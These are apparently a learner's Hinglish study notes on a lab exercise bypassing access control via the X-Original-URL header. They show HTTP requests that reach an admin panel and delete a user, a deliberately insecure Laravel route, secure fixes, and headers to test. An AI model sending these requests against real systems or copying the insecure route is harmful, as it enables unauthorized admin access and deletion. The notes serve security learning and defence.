# 🧠 Access Control Bypass via `X-Original-URL` (Full Notes)

## 📌 Concept Overview

* Front-end `/admin` ko block karta hai ❌
* Back-end header (`X-Original-URL`) ko trust karta hai ✔️
* Attacker header manipulate karke **hidden routes access kar leta hai**

👉 Result: **Authentication / Authorization Bypass**

---

## ⚙️ Root Cause

* Reverse proxy / load balancer URL rewrite karta hai
* Backend blindly trust karta hai:

  * `X-Original-URL`
  * `X-Rewrite-URL`

👉 **Security sirf front-end pe implement hoti hai (wrong design)**

---

## 🔥 Exploitation Flow

### 1️⃣ Admin Panel Access

```http
GET / HTTP/2
Host: <lab-id>
X-Original-URL: /admin
Cookie: session=...
```

✔ Admin panel open

---

### 2️⃣ Delete User

```http
GET /?username=carlos HTTP/2
Host: <lab-id>
X-Original-URL: /admin/delete
Cookie: session=...
```

✔ User deleted → Lab solved

---

## 🧠 Core Logic

```
Frontend sees  →  /
Backend sees   →  /admin/delete
```

👉 Path confusion = access control bypass

---

## ⚠️ Vulnerable Laravel Code (❌)

```php
Route::get('/', function (Illuminate\Http\Request $request) {

    $path = $request->header('X-Original-URL');

    if ($path === '/admin/delete') {
        $username = $request->query('username');

        // ❌ No authentication check
        \App\Models\User::where('username', $username)->delete();

        return "User deleted";
    }

    return "Home";
});
```

---

## 💥 Attack Request

```http
GET /?username=carlos
X-Original-URL: /admin/delete
```

👉 Backend route bypass → delete executed

---

## ✅ Secure Laravel Code

### ✔️ Proper Routing

```php
Route::middleware(['auth', 'is_admin'])->group(function () {
    Route::get('/admin', [AdminController::class, 'index']);
    Route::get('/admin/delete', [AdminController::class, 'deleteUser']);
});
```

---

### ✔️ Controller

```php
class AdminController extends Controller
{
    public function deleteUser(Request $request)
    {
        $request->validate([
            'username' => 'required|string'
        ]);

        \App\Models\User::where('username', $request->username)->delete();

        return "Deleted securely";
    }
}
```

---

### ✔️ Middleware

```php
public function handle($request, Closure $next)
{
    if (!auth()->check() || !auth()->user()->is_admin) {
        abort(403);
    }

    return $next($request);
}
```

---

## 🔒 Secure Design Principles

* ❌ User-controlled headers trust mat karo
* ✔️ Backend pe authorization enforce karo
* ✔️ Framework routing use karo
* ✔️ Input validation karo

---

## 🔍 Headers to Test (Real World)

* `X-Original-URL`
* `X-Rewrite-URL`
* `X-Forwarded-Host`
* `X-Forwarded-For`

---

## 💣 Impact

* Admin panel access
* User deletion
* Privilege escalation

👉 Severity: **High / Critical**

---

## 🛡️ Prevention

* Backend pe access control enforce karo
* Reverse proxy configuration secure rakho
* Unknown headers ignore karo
* Trusted proxies properly configure karo

---

## 🎯 One-Line Summary

> **Front-end restrictions bypass karke, header manipulation se backend protected routes access kiye.**

---

## 🧠 Interview Answer

> This vulnerability occurs when the backend trusts headers like `X-Original-URL` for routing. An attacker can manipulate this header to bypass front-end access controls and directly access restricted endpoints such as `/admin/delete`, leading to privilege escalation.

---
